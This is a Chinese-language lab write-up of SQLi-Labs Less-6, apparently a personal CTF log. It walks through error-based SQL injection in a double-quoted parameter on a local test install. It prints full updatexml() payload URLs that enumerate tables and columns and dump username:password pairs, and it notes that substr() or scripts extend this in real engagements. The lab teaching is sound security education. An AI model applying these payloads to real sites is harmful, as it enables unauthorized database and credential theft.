【SQLi-Labs】Less-6 双引号报错注入 Writeup

操作者：何芊宏 | 操作日期：2026.10.23 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, MySQL, 报错注入

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-6 (GET - Double Query - Double Quotes - String)
  • 提示：GET请求，双注入（报错注入），双引号闭合

2. 解题思路与前置原理

本关卡属于无回显环境（仅显示 "You are in........"），且上下文闭合符号由单引号变更为双引号。在双引号包裹的环境下，输入单引号会被当作普通字符串处理，不会破坏 SQL 语法；必须使用双引号 " 才能完成上下文逃逸。

由于无数据回显，常规的 UNION SELECT 联合查询无法将数据打印到前端，因此必须使用 报错注入（Error-based Injection）。通过 updatexml() 函数故意构造非法的 XPath 参数（如包含波浪号 ~），迫使数据库在抛出错误时，将目标数据原样拼接到报错信息中。

3. 操作步骤与解析

第一步：探测注入点与确认闭合方式

输入 URL：http://localhost/sqli-labs-master/Less-6/?id=1"

回显现象：页面抛出 SQL 语法错误：near '"1"" LIMIT 0,1'。

解释与原理：观察报错信息。输入单引号 ?id=1' 时页面正常，输入双引号 " 时报错，确认后端代码结构为 id = "$id"。

第二步：利用 updatexml 爆出数据库名

输入 URL：http://localhost/sqli-labs-master/Less-6/?id=1" AND updatexml(1, concat(0x7e, (select database()), 0x7e), 1) --+

回显现象：页面报错：XPATH syntax error: '~security~'。

解释与原理：使用双引号完成闭合后，利用 updatexml 报错机制。通过 concat 将 0x7e（波浪号）与当前库名拼接，强制触发报错并回显 security。

第三步：利用 updatexml 爆出表名

输入 URL：http://localhost/sqli-labs-master/Less-6/?id=1" AND updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 0x7e), 1) --+

回显现象：页面报错：XPATH syntax error: '~emails,referrers,uagents,users~'。

第四步：利用 updatexml 爆出列名

输入 URL：http://localhost/sqli-labs-master/Less-6/?id=1" AND updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'), 0x7e), 1) --+

回显现象：页面报错：XPATH syntax error: '~id,username,password~'。

第五步：提取最终数据（触发截断）

输入 URL：http://localhost/sqli-labs-master/Less-6/?id=1" AND updatexml(1, concat(0x7e, (select group_concat(username, 0x3a, password) from security.users), 0x7e), 1) --+

回显现象：页面报错：XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,D'。

解释与原理：0x3a 为冒号，用于格式化输出。由于 MySQL updatexml 报错机制存在 32 字符的物理截断限制，数据未能完整显示。

4. 踩坑记录与复盘

  • 地址栏回滚现象：在执行 Payload 并按下回车后，浏览器地址栏会自动重置为 ?id=1。此现象并非 Payload 发送失败，而是由于浏览器对包含大量特殊字符（如双引号、空格）的 URL 解析机制，或后端处理后的重定向（302）导致。判断注入是否成功的唯一标准是页面回显内容（如 XPATH 报错信息），而非地址栏的变化。
  • 上下文闭合机制：在双引号包裹的环境中，单引号不具备破坏语法的能力，会被当作普通字符。必须严格匹配当前上下文对应的闭合符号（双引号）。
  • 数据截断限制：报错注入天然存在长度限制。在实战（如 HVV）中，若需提取大量数据，需结合 substr() 函数进行分段截取，或编写自动化脚本进行循环提取。

5. 知识点总结

  • 双引号报错注入：原理与单引号报错注入一致，核心在于利用 updatexml 或 extractvalue 等函数，将数据夹带在错误信息中输出。
  • 信息收集思路：通过报错信息中的 near 提示，反推后端 SQL 语句的闭合方式，是应对所有未知注入点的通用起手式。
